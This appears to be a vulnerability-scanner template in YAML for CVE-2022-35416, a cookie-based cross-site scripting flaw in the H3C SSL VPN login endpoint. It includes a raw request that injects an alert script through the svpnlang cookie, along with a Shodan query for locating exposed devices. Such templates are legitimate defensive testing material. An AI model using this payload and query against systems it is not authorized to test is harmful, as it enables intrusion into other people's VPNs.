http:
- matchers:
  - part: body
    type: word
    words:
    - <script>alert('document.domain')</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wnm/login/login.json HTTP/1.1

    Host: {{Hostname}}

    Cookie: svpnlang=<script>alert(''document.domain'')</script>

    '
id: CVE-2022-35416
info:
  author: 0x240x23elu
  classification:
    cpe: cpe:2.3:a:h3c:ssl_vpn:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-35416
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.90981
    epss-score: 0.06779
  description: 'H3C SSL VPN 2022-07-10 and prior contains a cookie-based cross-site
    scripting vulnerability in wnm/login/login.json svpnlang.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, data theft, or other malicious activities.

    '
  metadata:
    max-request: 1
    product: ssl_vpn
    shodan-query: http.html_hash:510586239
    vendor: h3c
    verified: true
  name: H3C SSL VPN <=2022-07-10 - Cross-Site Scripting
  reference:
  - https://github.com/advisories/GHSA-9x76-78gc-r3m9
  - https://github.com/Docker-droid/H3C_SSL_VPN_XSS
  - https://nvd.nist.gov/vuln/detail/CVE-2022-35416
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/bughunter0xff/recon-scanner
  remediation: 'Apply the latest security patch or upgrade to a version of H3C SSL
    VPN that is not affected by this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,vpn,h3c,vuln
